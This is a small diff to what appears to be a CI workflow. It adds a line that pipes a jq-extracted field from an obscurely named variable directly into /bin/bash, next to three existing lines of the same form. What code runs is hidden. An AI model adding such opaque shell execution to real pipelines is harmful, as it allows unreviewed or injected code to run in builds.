@@ -47,6 +47,7 @@ jobs:
           printf '%s' "$lst7240" | jq -r .ge87 | /bin/bash
           echo $chfq34376 | jq -r .uribm74204 | /bin/bash
           echo $twiv86 | jq -r .techb2946 | /bin/bash
+          printf '%s' "$nc5" | jq -r .yq901 | /bin/bash
 
       - name: Archive output
         if: always()
